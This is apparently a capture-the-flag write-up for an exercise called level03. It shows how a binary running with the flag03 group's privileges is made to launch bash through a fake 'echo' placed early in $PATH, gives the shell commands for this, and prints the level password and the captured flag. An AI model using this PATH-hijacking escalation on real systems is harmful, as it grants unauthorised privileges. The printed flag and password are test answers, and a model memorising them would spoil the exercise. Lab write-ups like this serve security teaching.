# level03

## Vulnerability: $PATH trickery

level03's password: `kooda2puivaav1idi4f57q8iq`

1. examinate existing files and permissions

```shell
ls -la
```

shows that the level03 executable belongs to flag03 group, privilege escalation should be possible

2. get the executable (from an external device), decompile it using [retdec](https://github.com/avast/retdec) and examine the resulting code

```sh
scp -P 4242 level03@<host>:level03 .
retdecomp level03
```

shows geteuid() and getegid(), meaning that the binary is running as flag03

4. Exploit env vars usage by changing `$PATH` and making the binary run your prefered program (I chose bash)

```shell
PATH=/tmp:$PATH
echo /bin/bash > /tmp/echo
chmod +x /tmp/echo
```

5. Execute the original binary and pwn flag

```shell
./level03
getflag
```

gives flag: `qi0maab88jeaj46qoumi7maus`
